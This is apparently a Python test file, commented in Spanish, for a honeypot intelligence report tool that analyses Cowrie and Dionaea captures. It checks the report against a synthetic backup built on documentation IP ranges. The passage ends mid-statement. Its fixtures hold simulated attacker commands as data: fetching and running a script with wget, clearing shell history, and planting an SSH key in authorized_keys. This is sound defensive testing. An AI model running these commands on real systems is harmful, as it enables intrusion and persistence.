#!/usr/bin/env python3
"""test_analisis.py --- el informe de inteligencia, sobre un respaldo de mentira.

    python3 ANALISIS/tests/test_analisis.py

No hay forma de probar esto contra datos de verdad sin subir capturas reales
al repositorio, asi que se construye un respaldo sintetico con el MISMO
esquema que el de produccion y se comprueba que el informe cuenta lo que hay.

Lo que se comprueba:
  - Que los guiones se agrupan: doce IPs con el mismo guion son UN actor, no
    doce. Es la razon de ser de la herramienta y lo primero que se rompe si
    alguien toca la normalizacion.
  - QUE LA HORA SE CORRIGE. Cowrie firma con "Z" y escribe hora de Kyiv. Se
    comprueba contra la funcion DEL RECOLECTOR, extraida de su fichero: si
    las dos se separan, esto se pone rojo.
  - Que lo que no se puede leer se DICE, en vez de salir como un cero: una
    linea rota, una muestra sin fichero, un fichero cuyo hash no cuadra.
  - Que ttp.tsv esta bien formada y que no mapea de mas (regresion: cat
    /etc/passwd salia a la vez como T1087.001 y como T1552.001).
  - Que el informe no puede acabar en un commit.
"""
from __future__ import annotations

import hashlib
import json
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import tempfile
from datetime import date, datetime, timezone

AQUI = os.path.dirname(os.path.abspath(__file__))
ANALISIS = os.path.dirname(AQUI)
REPO = os.path.dirname(ANALISIS)
GUION = os.path.join(ANALISIS, "analisis.py")
TTP = os.path.join(ANALISIS, "ttp.tsv")

OK = 0
MAL = 0


def check(nombre, cond):
    global OK, MAL
    if cond:
        OK += 1
        print("  ok    %s" % nombre)
    else:
        MAL += 1
        print("  FALLO %s" % nombre)


def igual(nombre, esperado, obtenido):
    global OK, MAL
    if esperado == obtenido:
        OK += 1
        print("  ok    %s" % nombre)
    else:
        MAL += 1
        print("  FALLO %s\n          esperado [%r]  obtenido [%r]"
              % (nombre, esperado, obtenido))


# =====================================================================
# El respaldo de mentira
# =====================================================================
GUION_A = ["uname -a", "nproc", "cat /proc/cpuinfo", "wget http://%(ip)s/x.sh",
           "chmod +x x.sh", "./x.sh",
           # OVFUGZ, escrito byte a byte. En el respaldo real esta tira sale
           # 5.316 veces: es la palabra que la herramienta escribe y espera
           # leer de vuelta para saber si hay un shell al otro lado.
           "echo -e '\\x4f\\x56\\x46\\x55\\x47\\x5a'", "history -c"]
GUION_B = ["cat /etc/passwd", "whoami",
           "echo 'ssh-rsa AAAA' >> ~/.ssh/authorized_keys", "crontab -l"]

MUESTRA = b"#!/bin/sh\necho hola\n"
SHA = hashlib.sha256(MUESTRA).hexdigest()


def construye(raiz, *, corrompe=False, sin_fichero=False):
    cow = os.path.join(raiz, "var/lib/docker/volumes/dirtyland_cowrie-var/_data")
    dio = os.path.join(raiz,
                       "var/lib/docker/volumes/dirtyland_dionaea-var/_data/lib/dionaea")
    for d in (cow + "/log/cowrie", cow + "/lib/cowrie/downloads",
              dio + "/binaries", raiz + "/var/lib/dirtyland-reporter",
              raiz + "/opt/dirtyland/Telegram Reports/state"):
        os.makedirs(d, exist_ok=True)

    if not sin_fichero:
        datos = MUESTRA + (b"roto" if corrompe else b"")
        with open(cow + "/lib/cowrie/downloads/" + SHA, "wb") as fh:
            fh.write(datos)

    # UN ARTEFACTO DEL PROPIO SENUELO, con nombre de captura. Es el
    # /var/log/auth.log que genera commands/authlog.py en cada sesion y que
    # Cowrie persiste en este mismo directorio: en el primer respaldo real
    # eran 4.161 de las 4.244 "capturas", o sea que contarlo como malware
    # multiplicaba la cifra por cincuenta.
    arte = (b"2026-08-31T20:17:00.814800+03:00 pc-dev-003-ignis "
            b"CRON[14261]: pam_unix(cron:session): session opened\n") * 40
    with open(cow + "/lib/cowrie/downloads/" +
              hashlib.sha256(arte).hexdigest(), "wb") as fh:
        fh.write(arte)

    def ev(sid, ip, eid, ts, **kw):
        d = {"session": "s%04d" % sid, "src_ip": ip, "eventid": eid,
             "timestamp": ts, "protocol": kw.pop("proto", "ssh")}
        d.update(kw)
        return json.dumps(d)

    lineas = []
    sid = 0
    for i in range(12):
        sid += 1
        ip = "203.0.113.%d" % (10 + i)
        # LAS 10:00 DE KYIV CON UNA "Z" DETRAS. En UTC son las 07:00. Todo el
        # informe depende de que esto se corrija.
        ts = "2026-09-01T10:00:00Z"
        lineas.append(ev(sid, ip, "cowrie.session.connect", ts))
        lineas.append(ev(sid, ip, "cowrie.login.failed", ts,
                         username="root", password="123456"))
        lineas.append(ev(sid, ip, "cowrie.login.success", ts,
                         username="admin", password="admin"))
        for c in GUION_A:
            lineas.append(ev(sid, ip, "cowrie.command.input", ts,
                             input=c % {"ip": ip} if "%(ip)s" in c else c))
        lineas.append(ev(sid, ip, "cowrie.session.file_download", ts,
                         shasum=SHA, url="http://%s/x.sh" % ip, outfile="x"))
        # La version del cliente y el HASSH los pone la herramienta al
        # negociar, antes de teclear nada: son la huella que el atacante no
        # elige. Las doce sesiones corren lo mismo y comparten HASSH.
        lineas.append(ev(sid, ip, "cowrie.client.version", ts,
                         version="SSH-2.0-Go"))
        lineas.append(ev(sid, ip, "cowrie.client.kex", ts,
                         hassh="aae6b9604f6f3356543709a376d7f657"))
        lineas.append(ev(sid, ip, "cowrie.session.closed", ts,
                         duration_ms=400 if i % 3 == 0 else 4200 + i * 700))
    for i in range(4):
        sid += 1
        ip = "198.51.100.%d" % (20 + i)
        lineas.append(ev(sid, ip, "cowrie.session.connect",
                         "2026-09-05T04:00:00Z", proto="telnet"))
        lineas.append(ev(sid, ip, "cowrie.login.success",
                         "2026-09-05T04:00:00Z", proto="telnet",
                         username="alyosha", password="x"))
        # Entran, comprueban que la clave vale y se van sin teclear nada:
        # es justo lo que el apartado nuevo tiene que saber distinguir.
        lineas.append(ev(sid, ip, "cowrie.session.closed",
                         "2026-09-05T04:00:00Z", proto="telnet",
                         duration_ms=120000))
        for c in GUION_B:
            lineas.append(ev(sid, ip, "cowrie.command.input",
                             "2026-09-05T04:00:00Z", proto="telnet", input=c))
    # NUESTRO PROPIO TRAFICO. Al probar el senuelo desde la VPS, la conexion
    # entra por la puerta de enlace del puente de Docker y Cowrie la anota
    # como una sesion mas. En el respaldo real del 2026-09-11 eran 67
    # sesiones y LAS 32 entradas con la credencial alyosha: el 100% de esa
    # credencial era nuestro. Aqui van tres sesiones equivalentes.
    for i in range(3):
        sid += 1
        lineas.append(ev(sid, "172.20.0.1", "cowrie.session.connect",
                         "2026-09-02T12:00:00Z"))
        lineas.append(ev(sid, "172.20.0.1", "cowrie.login.success",
                         "2026-09-02T12:00:00Z",
                         username="alyosha", password="alyosha123"))
        lineas.append(ev(sid, "172.20.0.1", "cowrie.command.input",
                         "2026-09-02T12:00:00Z", input="id"))

    # Una linea a medias, como la deja un respaldo en caliente.
    lineas.append('{"session": "sXXX", "eventid": "cowrie.comm')
    with open(cow + "/log/cowrie/cowrie.json", "w", encoding="utf-8") as fh:
        fh.write("\n".join(lineas) + "\n")

    db = sqlite3.connect(dio + "/dionaea.sqlite")
    db.execute("CREATE TABLE connections (connection INTEGER PRIMARY KEY,"
               " connection_type TEXT, connection_protocol TEXT,"
               " connection_timestamp INTEGER, local_port INTEGER,"
               " remote_host TEXT)")
    db.execute("CREATE TABLE downloads (download INTEGER PRIMARY KEY,"
               " connection INTEGER, download_md5_hash TEXT, download_url TEXT)")
    filas, n = [], 0
    for ip, proto, puerto, veces in (("203.0.113.10", "smbd", 445, 30),
                                     ("192.0.2.10", "mssqld", 1433, 7)):
        for _ in range(veces):
            n += 1
            filas.append((n, "accept", proto, 1757585702, puerto, ip))
    db.executemany("INSERT INTO connections VALUES (?,?,?,?,?,?)", filas)
    # Dionaea nombra sus capturas por SHA-256, pero eso es una convencion:
    # la herramienta calcula los dos hashes y no se fia del nombre.
    dio_a = b"MZ\x90\x00 captura de mentira A"
    dio_b = b"MZ\x90\x00 captura de mentira B, sin fila en la base"
    for datos in (dio_a, dio_b):
        with open(dio + "/binaries/" +
                  hashlib.sha256(datos).hexdigest(), "wb") as fh:
            fh.write(datos)
    db.execute("INSERT INTO downloads VALUES (1,1,?,'smb://x')",
               (hashlib.md5(dio_a).hexdigest(),))
    # Un MD5 anotado cuyo binario NO esta en el respaldo.
    db.execute("INSERT INTO downloads VALUES "
               "(2,2,'d41d8cd98f00b204e9800998ecf8427e','smb://y')")
    db.commit()
    db.close()

    st = sqlite3.connect(raiz + "/var/lib/dirtyland-reporter/state.sqlite3")
    st.execute("CREATE TABLE sent (platform TEXT, key TEXT, ts TEXT)")
    st.execute("INSERT INTO sent VALUES ('abuseipdb',"
               "'203.0.113.10@2026-09-01','x')")
    # CON EL PREFIJO, que es como lo escriben los reporters de verdad:
    # "upload:<sha256>" y "comment:<sha256>" son dos envios de la misma
    # muestra. Cortar solo por "@" dejaba el prefijo pegado y ninguna muestra
    # casaba --- el informe decia "0 publicados" con 843 envios en la base.
    st.execute("INSERT INTO sent VALUES ('virustotal',?,'x')",
               ("upload:" + SHA,))
    st.commit()
    st.close()

    with open(raiz + "/opt/dirtyland/Telegram Reports/state/"
              "cowrie_telegram_state.json", "w", encoding="utf-8") as fh:
        json.dump({"playbooks": {}, "ips": {}, "samples": [SHA],
                   "creds": ["admin:admin"],
                   "banned": ["203.0.113.11", "203.0.113.12",
                              "203.0.113.13", "203.0.113.14"]}, fh)

    # EL VOLCADO DEL CORTAFUEGOS, con los cuatro casos que hay que saber
    # distinguir. Quien ordeno un baneo NO esta en la memoria del bot ---ahi
    # "banned" es una lista plana--- sino en el comentario de la regla:
    #
    #   .11  automatico          .13  etiqueta vieja: no se sabe quien fue,
    #   .12  a mano por Telegram       porque hasta el 2026-08-29 los dos
    #   .14  en la memoria y YA NO      caminos escribian ese mismo texto
    #        en el cortafuegos
    #
    # Y 198.51.100.77 esta en el cortafuegos pero NO en la memoria, que es el
    # caso contrario y no debe colarse en ninguno de los recuentos.
    with open(raiz + "/nftables-ruleset.txt", "w", encoding="utf-8") as fh:
        fh.write("""table inet dirtyland {
  set ban4 {
    type ipv4_addr
    flags interval
    elements = { 203.0.113.11 comment "IP BANEADA COWRIE AUTOMATICO",
                 203.0.113.12 comment "IP BANEADA COWRIE MANUAL DESDE TELEGRAM",
                 203.0.113.13 comment "IP BANEADA COWRIE POR ADMIN DESDE TELEGRAM",
                 198.51.100.77 comment "IP BANEADA COWRIE AUTOMATICO" }
  }
}
""")


def corre(raiz, salida, geoip=None, extra=("--sin-anonimizar",)):
    """Con --geoip a un directorio VACIO a proposito.

    Sin eso, el resultado dependia de si la maquina donde corre la prueba
    tiene generadas las tablas de paises ---son 17 MB de datos derivados que
    no estan en el repositorio---, y la misma prueba salia verde en un sitio
    y roja en otro. Lo que no puede depender del entorno, no depende.
    """
    orden = [sys.executable, GUION, "--respaldo", raiz, "--salida", salida,
             "--geoip", geoip or os.path.join(os.path.dirname(salida),
                                              "sin-tablas")]
    os.makedirs(orden[-1], exist_ok=True)
    return subprocess.run(orden + list(extra), capture_output=True,
                          text=True, stdin=subprocess.DEVNULL)


# =====================================================================
print("== el informe sobre un respaldo de mentira ==")
BASE = tempfile.mkdtemp()
try:
    raiz = os.path.join(BASE, "resp")
    construye(raiz)
    salida = os.path.join(BASE, "informe.html")
    r = corre(raiz, salida)
    igual("la herramienta termina bien", 0, r.returncode)
    if r.returncode:
        print(r.stderr[-2000:])
    texto = open(salida, encoding="utf-8").read()

    # --- Los guiones se agrupan ---------------------------------------
    #
    # Doce sesiones desde doce IPs distintas con las mismas ordenes son UN
    # actor. Si la normalizacion se rompe ---por ejemplo, si deja de
    # sustituir la URL, que lleva la IP dentro--- salen doce guiones de uno.
    # Se cuentan los guiones DISTINTOS y no las filas: el mismo guion sale
    # en dos tablas ---la de siempre, por numero de IPs, y la de "los que
    # mas aprietan", por ordenes por IP--- y eso son dos preguntas sobre el
    # mismo actor, no dos actores.
    guiones = sorted(set(re.findall(
        r"<td><code>([0-9a-f]{12})</code></td><td class=\"n\">(\d+)</td>"
        r"<td class=\"n\">(\d+)</td>", texto)))
    igual("los dos guiones salen como dos, no como dieciseis",
          2, len(guiones))
    if len(guiones) == 2:
        igual("el guion mayoritario agrupa las doce IPs", "12", guiones[0][1])
        igual("y el otro, las cuatro", "4", guiones[1][1])

    # --- La hora ------------------------------------------------------
    check("la hora de Cowrie se pasa a UTC (10:00 Kyiv -> 07:00)",
          "2026-09-01 07:00" in texto)
    check("y no se cuela la hora escrita tal cual",
          "2026-09-01 10:00" not in texto)

    # --- Lo que no se puede leer, se dice ------------------------------
    check("la linea rota del log se cuenta y se dice",
          "1 línea de <code>cowrie.json</code> no se ha podido leer" in texto)
    # Las dos cifras siguen siendo las mismas; lo que cambio es DONDE se
    # escriben. El resumen dejo de ser diez tarjetas iguales ---que decian
    # que las diez cifras eran del mismo tipo, y no lo son--- y ahora las
    # partes van en la leyenda de su franja y el total en el texto.
    check("y las sesiones buenas se cuentan todas",
          ">16</tspan> sesiones en Cowrie" in texto)
    # El resumen suma los dos senuelos: 16 sesiones de Cowrie + 37
    # conexiones de Dionaea del respaldo sintetico.
    check("las participaciones suman los dos senuelos",
          "<b>53</b> en total" in texto)
    check("y las dos partes salen en la misma franja",
          ">37</tspan> conexiones a Dionaea" in texto)

    # --- Nuestro propio trafico no es un ataque -----------------------
    #
    # El senuelo probado desde la VPS entra por la puerta de enlace de Docker,
    # y Cowrie lo anota igual que a cualquiera. Contarlo infla las sesiones,
    # las ordenes y ---sobre todo--- las credenciales: en el respaldo real,
    # LAS 32 entradas con alyosha eran nuestras y ninguna de fuera.
    #
    # Las tres sesiones de 172.20.0.1 del respaldo de mentira NO cuentan.
    check("nuestro propio trafico no cuenta como sesion",
          ">16</tspan> sesiones en Cowrie" in texto)
    # OJO AL MATIZ, que hace la prueba mejor: el respaldo de mentira usa
    # "alyosha" TAMBIEN desde fuera (las cuatro sesiones de telnet, con otra
    # clave). Asi que no vale comprobar que el nombre no aparece ---aparece,
    # y debe--- sino que no aparece LA CREDENCIAL que solo usamos nosotros.
    # Se filtra por IP, no por usuario, y esto lo demuestra.
    check("ni la credencial que solo usamos nosotros",
          "alyosha123" not in texto)
    check("pero el mismo usuario desde fuera SI cuenta",
          "alyosha" in texto)
    check("pero se DICE que se han descartado, y cuantas",
          "son NUESTRAS y se han descartado" in texto)
    check("y se dice desde donde venian",
          "172.20.0.1" in texto)
    # El filtro va por RANGO y no por lista: una lista se queda vieja en
    # cuanto Docker renumera. Y no puede ser is_global, que en Python cuenta
    # como privados los rangos de documentacion con los que esta hecho este
    # mismo respaldo de mentira.
    sys.path.insert(0, ANALISIS)
    import analisis as _an4
    check("172.20.0.1 se reconoce como nuestra", _an4.es_nuestra("172.20.0.1"))
    check("y 203.0.113.7 NO, que es de documentacion y no nuestra",
          not _an4.es_nuestra("203.0.113.7"))
    check("ni una IP de internet corriente",
          not _an4.es_nuestra("185.113.223.140"))

    # LAS DOS PROPORCIONES NO SE ENCADENAN EN UN EMBUDO. `conordenes` cuenta
    # SESIONES y `n_ok` cuenta INTENTOS DE CREDENCIAL: no son subconjuntos uno
    # del otro ni comparten unidad. Encadenarlos en una sola figura seria
    # mezclar dos escalas, que es lo que este informe no hace en ningun otro
    # sitio. Se comprueba que cada una tiene SU franja, con su complemento.
    check("las sesiones que teclean van contra las que no",
          "se fueron sin teclear nada" in texto)
    check("y los logins acertados contra los fallidos",
          "intentos fallidos" in texto)

    # --- CADA FRANJA DICE DE QUE SENUELO HABLA -------------------------
    #
    # Las tres se ven iguales y NO hablan del mismo conjunto: la primera es
    # de los dos senuelos y las otras dos solo de Cowrie ---Dionaea no tiene
    # shell ni credenciales que acertar---. Sin decirlo, la unica forma de
    # saberlo era sumar las cifras de la leyenda y ver que el total no
    # coincidia con las participaciones.
    #
    # Se cuenta: tres franjas, tres ambitos. Una franja nueva sin el suyo
    # pone esto rojo, que es el unico momento en que alguien se acordaria.
    check("cada franja lleva escrito su ambito",
          texto.count('<p class="ambito">') == texto.count("<figure><p"))
    # Cinco: las participaciones, las dos proporciones, los baneos y la
    # duracion de las sesiones.
    igual("y hay una por cada franja del resumen", 5,
          texto.count('<p class="ambito">'))
    check("la de las participaciones es de los dos senuelos",
          '<span>Cowrie y Dionaea</span>' in texto)
    # Las dos proporciones y la duracion: Dionaea cuenta conexiones
    # sueltas, no sesiones con principio y final.
    igual("las de las proporciones son solo de Cowrie", 3,
          texto.count("<span>Solo Cowrie</span>"))
    # El ambito de la franja de logins tiene que decir POR QUE, y no solo
    # que si: "solo Cowrie" a secas se lee como un recorte arbitrario.
    check("y dicen por que Dionaea no entra",
          "solo se cuentan" in texto and "no emula ningún shell" in texto)
    # Las mismas palabras que el conmutador de los cronogramas. Dos nombres
    # distintos para el mismo recorte obligan a comprobar que son el mismo.
    check("con las mismas palabras que el conmutador de los cronogramas",
          ">Solo Cowrie<" in texto and ">Solo Dionaea<" in texto)
    # La de los baneos no habla de un senuelo sino del cortafuegos, que es
    # de donde sale el dato. La pastilla dice SIEMPRE de donde salen las
    # cifras de esa figura; aqui la respuesta no es Cowrie ni Dionaea.
    check("y la de los baneos dice que sale del cortafuegos",
          "<span>Cortafuegos</span>" in texto)

    # --- QUIEN PUSO CADA BANEO ------------------------------------------
    #
    # "74 baneadas" no dice lo unico que interesa de una reaccion: cuanta la
    # puso una maquina sola y cuanta una persona. El dato no esta en la
    # memoria del bot, sino en el comentario de la regla de nftables, y el
    # respaldo de mentira trae un volcado con los cuatro casos.
    check("la franja de baneos separa las automaticas",
          ">1</tspan> puesta automáticamente por el vigilante" in texto)
    check("de las puestas a mano",
          ">1</tspan> puesta a mano desde Telegram" in texto)
    # La etiqueta vieja NO se cuenta como manual aunque la escribiera una
    # persona: hasta el 2026-08-29 los dos caminos ponian ese mismo texto,
    # asi que un baneo viejo es indistinguible de uno automatico. Suponerlo
    # seria inventarse el dato que el apartado existe para dar.
    check("y las de la etiqueta vieja van aparte, sin suponer quien fue",
          ">1</tspan> con la etiqueta antigua, sin saber quién" in texto)
    check("las que el bot recuerda y ya no estan, tambien",
          ">1</tspan> que el bot recuerda y ya no está en el cortafuegos"
          in texto)
    # LA BARRA TIENE QUE SUMAR LAS MISMAS QUE DICE EL TEXTO. Con solo los
    # tres origenes sumaria 3 debajo de una linea que dice 4.
    check("y la figura suma las mismas que dice el texto",
          "<b>4 IPs baneadas</b>" in texto)
    # Lo que esta en el cortafuegos y NO en la memoria no entra en ningun
    # recuento: la figura habla de las que el bot recuerda.
    check("una IP del cortafuegos que el bot no recuerda no entra",
          "198.51.100.77" not in texto)

    # --- AGRUPAR POR /24, Y DECIR QUE NO AGRUPA -----------------------
    #
    # La tabla de redes se pone para ensenar que detras de cientos de
    # direcciones hay unas pocas redes. En el respaldo real sale lo
    # CONTRARIO ---7.574 IPs en 6.061 redes, 1,25 por red--- y el apartado
    # lo dice asi. Lo que se comprueba aqui es que las cifras salen de
    # contar y no de una frase escrita a mano: si alguien cambia el
    # criterio de agrupacion, estas dos dejan de cuadrar.
    check("las IPs se agrupan por red /24", "Por red /24" in texto)
    check("con la red del respaldo de mentira", "203.0.113.0/24" in texto)
    check("y se dice cuantas redes y cuantas IPs por red",
          "redes /24 distintas" in texto and "IPs por red" in texto)
    # La tabla lleva las ordenes al lado de las IPs a proposito: una red con
    # muchas direcciones y cero ordenes es un barrido, y es la misma
    # distincion que explica la figura de 2.4.
    check("y la tabla deja ver si esas redes teclean o solo tocan",
          "Conexiones (Dionaea)" in texto.rsplit("Por red /24", 1)[1][:3000])

    # --- CADENA DE CUSTODIA -------------------------------------------
    #
    # Sin esto el informe es un panel bonito: nadie de fuera puede repetirlo
    # ni comprobar que se hizo sobre lo que dice. Y el hash que se publica
    # tiene que ser EL DE VERDAD, no uno cualquiera: se recalcula aqui el
    # del fichero del respaldo de mentira y se busca en el informe.
    check("el informe dice cómo se ha hecho",
          "Cómo se ha hecho este informe" in texto)
    check("con el respaldo, la orden, la herramienta y el entorno",
          "Respaldo analizado" in texto and "Orden que lo generó" in texto
          and "Herramienta" in texto and "Entorno" in texto)
    check("y el huso que se le aplicó a Cowrie",
          "Huso aplicado a Cowrie" in texto)
    sha_log = hashlib.sha256(
        open(raiz + "/var/lib/docker/volumes/dirtyland_cowrie-var/_data/log/"
             "cowrie/cowrie.json", "rb").read()).hexdigest()
    check("el SHA-256 que publica es el del fichero de verdad",
          sha_log[:32] in texto)
    # El de la herramienta tambien: un informe que no dice con que version
    # se hizo no se puede repetir.
    sha_guion = hashlib.sha256(open(GUION, "rb").read()).hexdigest()
    check("y el de la propia herramienta", sha_guion[:32] in texto)

    # --- LO QUE NO SE PUEDE SABER, ESCRITO POR NOSOTROS ---------------
    check("el informe escribe sus propios límites",
          "Lo que este informe no puede saber" in texto)
    check("empezando por que el país de una IP no es el de quien ataca",
          "El país de una IP no es el país de quien ataca" in texto)
    check("y que veintiún días no son una tendencia",
          "no son una tendencia" in texto)

    # --- LA AUSENCIA TAMBIEN INFORMA ----------------------------------
    #
    # ttp.tsv es la lista de lo que el informe SABE reconocer, asi que las
    # filas a cero son exactamente "se buscó y no apareció". Sin el
    # apartado, no salir no se distingue de no haberse mirado.
    check("se dice lo que se buscó y no apareció",
          "Lo que no se ha visto" in texto)
    # Y una tecnica que SI se ha visto no puede salir en esa lista.
    check("y lo que sí se vio no sale ahí",
          "T1070.003" not in texto.rsplit("Lo que no se ha visto", 1)[1])

    # --- TRES CAMPOS DEL REGISTRO QUE ESTABAN Y NO SE LEIAN -----------
    #
    # LA HUELLA QUE EL ATACANTE NO ELIGE. El guion de ordenes lo escribe
    # el; la version del cliente y el HASSH los pone su HERRAMIENTA al
    # negociar, antes de teclear nada. Por eso valen mas para decir "estos
    # dos usan lo mismo": el guion se cambia escribiendo otro, el HASSH
    # solo recompilando o cambiando de libreria.
    check("se lee con qué se conectan", "Con qué se conectan" in texto)
    check("y sale la version del cliente", "SSH-2.0-Go" in texto)
    check("y el HASSH, con a que cliente corresponde",
          "aae6b9604f6f3356543709a376d7f657" in texto
          and "Se presenta como" in texto)

    # LA DURACION separa sola al que toca el puerto y se va del que se
    # queda. Estaba en cowrie.session.closed y no se leia.
    check("se lee cuánto duran las sesiones", "Cuánto duran" in texto)
    check("y se reparten entre tocar y salir y quedarse dentro",
          "menos de 1 segundo: tocar y salir" in texto)

    # LA HORA. Con veintiun dias hay muestra de sobra, y la forma de la
    # curva contesta si esto lo llevan personas o maquinas.
    check("hay reparto por hora del día", "A qué hora" in texto
          and "Participaciones por hora UTC" in texto)
    # Y va en UTC como todo el informe, no en la hora de nadie.
    check("y se dice que la hora es UTC", "UTC, con" in texto)

    # QUE HICIERON LOS QUE ACERTARON. Es la pregunta que justifica haber
    # sembrado credenciales, y no se contestaba. En el respaldo de mentira
    # las doce de SSH teclean y las cuatro de telnet entran y se van.
    check("se dice qué hicieron los que acertaron",
          "Qué hicieron los que acertaron" in texto)
    check("y cuántos entraron y se fueron sin teclear nada",
          "sin escribir una sola orden" in open(GUION, encoding="utf-8").read())
    check("con el desglose por credencial",
          "Teclearon algo" in texto)

    # --- LO QUE YA ESTABA EN LOS DATOS Y NO SE SACABA -----------------
    #
    # Cuatro cruces que no necesitan leer nada nuevo del registro: solo
    # juntar dos cosas que estaban en tablas distintas.

    # 1. LAS QUE TOCARON LOS DOS SENUELOS. La pregunta solo se puede hacer
    # porque los dos estan en direcciones publicas DISTINTAS (README 3.2.7):
    # con los dos en la misma IP, cualquiera que tocara un puerto estaria
    # tocando "los dos" y el apartado no diria nada.
    check("se cruzan las IPs de los dos señuelos",
          "Las que tocaron los dos señuelos" in texto)
    check("y sale la que ataco por los dos",
          "203.0.113.10" in texto and "tocó <b>los dos señuelos</b>"
          in texto)

    # 2. LAS TIRAS \\xNN, EN CLARO. En la orden son ruido; descifradas son
    # el nombre que la herramienta se pone a si misma.
    check("las tiras hexadecimales se leen en claro",
          "Cómo se llaman a sí mismas" in texto and ">OVFUGZ</code>" in texto)
    # Y LA ORDEN SE ENSENA TAL CUAL LLEGO: esto es una lectura de la prueba,
    # no una sustitucion. Si el descifrado se colara en la orden, el
    # informe estaria ensenando algo que el atacante no mando.
    check("pero la orden sigue enseñándose tal como llegó",
          "\\x4f\\x56\\x46" in texto)

    # 3. QUIEN SIRVE EL MALWARE Y ADEMAS ATACA. La URL de origen y la lista
    # de atacantes estaban en dos tablas y nadie las cruzaba.
    check("se cruza el origen de las muestras con los atacantes",
          "Quién sirve el malware, y además ataca" in texto)

    # 4. DOS PREGUNTAS SOBRE LOS GUIONES, DOS TABLAS. Por numero de IPs sale
    # lo que mas se repite; por ordenes por IP sale el que vuelve. Ordenar
    # solo por una esconde la otra.
    check("los guiones se pueden mirar por intensidad, no solo por IPs",
          "Los que más aprietan" in texto and "Órdenes por IP" in texto)

    # --- Las marcas de la memoria y del reporter ----------------------
    # En HTML la marca va en la misma fila <tr> que la IP. Se busca dentro
    # de esa fila y no en todo el documento: "baneada" aparece tambien en el
    # texto de la seccion, y buscarlo suelto daria verde sin marcar nada.
    def fila_de(ip):
        m = re.search(r"<tr>(?:(?!</tr>).)*<code>%s</code>.*?</tr>"
                      % re.escape(ip), texto, re.S)
        return m.group(0) if m else ""

    check("la IP baneada sale marcada", "baneada" in fila_de("203.0.113.11"))
    check("y la denunciada, tambien",
          "denunciada" in fila_de("203.0.113.10"))
    check("la muestra ya publicada se marca como publicada",
          "<td>sí</td>" in fila_de(SHA[:20] + "…"))
    check("aunque la clave lleve el prefijo del reporter (upload:, comment:)",
          "upload:" not in texto)

    # --- Las TTPs -----------------------------------------------------
    check("mapea el borrado de historial", "T1070.003" in texto)
    check("y la persistencia por authorized_keys", "T1098.004" in texto)
    check("y la descarga de herramientas", "T1105" in texto)
    check("la columna ATT&CK va marcada como inferida",
          "ATT&amp;CK (inferido)" in texto)
    # REGRESION: "cat /etc/passwd" casaba a la vez con el descubrimiento de
    # cuentas y con "credenciales en ficheros", y aparecia dos veces con el
    # mismo comando de ejemplo. Una tecnica de mas es una afirmacion falsa.
    check("cat /etc/passwd es descubrimiento de cuentas", "T1087.001" in texto)
    # Ahora el informe lista tambien LO QUE NO SE HA VISTO, asi que la
    # tecnica aparece ---y debe: que se buscara y no apareciera es
    # justamente lo que hay que comprobar---. Lo que no puede es salir
    # antes de ese apartado, o sea contada como observada.
    # rsplit y no split: el titulo sale tres veces ---en el apartado 0, en
    # el indice desplegable y en su propio h3--- y lo que interesa es lo que
    # va DESPUES del ultimo, que es la tabla de verdad.
    _visto, _sinver = texto.rsplit("Lo que no se ha visto", 1)
    check("y NO cuenta ademas como credenciales en ficheros",
          "T1552.001" not in _visto and "T1552.001" in _sinver)

    # --- La cola larga de paises ---------------------------------------
    #
    # Las tablas y los esquemas ensenan los de arriba. El recuento de paises
    # tiene que ir sobre TODAS las IPs, no sobre las mostradas: en el
    # respaldo real habia 148 paises y 22 de ellos con una sola IP, que no
    # salen en ningun sitio pero tambien atacaron.
    # Sin tablas no se puede comprobar el recuento de paises, pero SI que
    # el informe lo dice en vez de ensenar columnas vacias sin explicacion.
    check("sin tablas de paises, se dice por que van vacias",
          "Sin tablas de geolocalización" in texto)
    # Se mira la TARJETA, no la frase: el indice del apartado 0 nombra
    # "paises distintos" siempre, porque describe el informe entero.
    check("y no se inventa un recuento de paises",
          "<span>países distintos</span>" not in texto)

    # --- Los esquemas --------------------------------------------------
    #
    # Van en SVG en linea y sin librerias: el informe tiene que abrirse
    # dentro de un ano, en otra maquina y sin red. Un <script src> de un CDN
    # lo convierte en algo que un dia deja de verse.
    check("el cronograma sale, con su eje de dias y su eje de meses",
          "<svg" in texto and "septiembre de 2026" in texto)
    check("y el eje de arriba lleva el numero de dia",
          re.search(r'font-size="11" fill="#5d6673">\d+</text>', texto)
          is not None)
    # Ojo al comprobarlo: el informe SI lleva "http://" dentro, porque las
    # URLs de los atacantes salen en la tabla de malware. Lo que no puede
    # llevar es algo que el navegador vaya a DESCARGAR.
    # El informe SI lleva un <script>, pero va ENTERO dentro del fichero.
    # Lo que esta comprobacion protege ---y lo dice el comentario de
    # arriba--- es que el navegador no tenga que DESCARGAR nada, que es lo
    # que haria que un dia dejara de verse. Un guion en linea no descarga.
    check("no se carga nada de fuera: ni script, ni src, ni hoja de estilo",
          not any(x in texto
                  for x in ("<script src", " src=", "<link", "@import")))
    check("y el unico guion va dentro del fichero",
          texto.count("<script") == 1)

    # --- Los subapartados ------------------------------------------------
    #
    # Van numerados "2.1, 2.2..." y el numero de la izquierda se LEE del
    # apartado, no se cuenta aparte: el anexo va con letra y el 9 solo
    # existe si hay conclusiones, asi que un contador propio se equivocaria.
    subs = re.findall(r'<h3 id="ap-(\d+)-(\d+)">(?:<[^>]+>)*([^<]*)', texto)
    check("los subapartados van numerados por su apartado",
          any(txt.startswith("2.1") for _a, _b, txt in subs)
          and any(txt.startswith("2.2") for _a, _b, txt in subs))
    check("los del anexo van con su letra: A.1, A.2",
          any(txt.startswith("A.1") for _a, _b, txt in subs)
          and any(txt.startswith("A.2") for _a, _b, txt in subs))

    # La franja de los subapartados se pega DEBAJO de la de los apartados,
    # y las cabeceras de tabla debajo de las dos. Si alguien toca el alto de
    # una y no la variable, se meten unas debajo de otras.
    hoja2 = re.search("<style>(.*?)</style>", texto, re.S).group(1)
    check("la franja de subapartado se pega bajo la banda",
          "top: var(--banda)" in hoja2 and "--sub:" in hoja2)
    check("y las cabeceras de tabla, bajo las dos",
          "top: calc(var(--banda) + var(--sub))" in hoja2)
    fuente = open(GUION, encoding="utf-8").read()
    check("el area del triangulo va por la raiz, no por el lado",
          "** 0.5" in fuente)
    # Las dos figuras miden cosas DISTINTAS: el circulo cuenta IPs (desde
    # cuantos sitios se ataca) y las barras cuentan ordenes (quien repite
    # mas). Con las dos sobre sesiones salian casi iguales, y dos figuras
    # que dicen lo mismo no son dos figuras.
    check("el circulo va por IPs distintas y las barras por ordenes",
